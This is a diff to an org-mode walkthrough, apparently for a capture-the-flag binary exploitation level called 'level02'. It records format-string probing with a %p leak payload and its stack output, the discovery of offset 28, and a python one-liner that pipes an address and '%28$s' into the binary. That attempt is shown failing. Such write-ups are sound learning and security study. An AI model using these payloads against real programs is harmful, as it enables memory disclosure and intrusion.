@@ -1,3 +1,4 @@
+#+title: walkthrough
 * Data Gathering
 ** Binary Sec
 #+begin_src shell
@@ -291,7 +292,8 @@ don't use it for strncmp is Hardcoded.
 **** CANC May modify the string on the elffile to point to one i craft/know the content.
 CLOSED: [2025-11-26 Wed 16:08]
 I don't got perms.
-**** May i create a dynamic lib
+**** CANC May i create a dynamic lib
+CLOSED: [2025-11-27 Thu 13:54]
 #+begin_src shell
 !strace ./$USER
 execve("./level02", ["./level02"], [/* 20 vars */]) = 0
@@ -517,17 +519,33 @@ l      (ell) A following integer conversion corresponds to a long
         conversion, this length modifier is ignored (C99; not in SUSv2).
 https://man7.org/linux/man-pages/man3/printf.3.html
 #+end_quote
-
+**** Get offset
 #+begin_src shell
-    string format test
+          string format test
 
-    AAAAAAAA%p%p%p%p%p%p%p%p
+      --[ Username: BBBBBBBB%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+    look like yes
+      BBBBBBBB0x7fffffffea20(nil)0x610x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffec180x1f7ff9a080x61(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x4242424242424242#Here is the buffer.
+  BBBBBBBB%28$p%29$p%30$p Format string.
+BBBBBBBB0x42424242424242420x39322570243832250x70243033257024 does not have access!
 
-  username_va=0x7fffffffe9f0
-  change AAAAAAAA with the username va
 
 
 
+
+#+end_src
+offset = 28
+#+begin_src shell
+    username_va=0x00007fffffffe9f0
+    change AAAAAAAA with the username va and change %28$p -P %28$s.
+    (python -c 'print "\x00\x00\x7f\xff\xff\xff\xe9\xf0"[::-1]+"%28$s"') | ./$USER
+    ===== [ Secure Access System v1.0 ] =====
+    /***************************************\
+    | You must login to access this system. |
+    \**************************************/
+    --[ Username: --[ Password: *****************************************
+    πιÿÿÿ does not have access!
+    Is failing because the ptr of the stack is wrong.
 #+end_src
 * Exploit
 #+begin_src shell
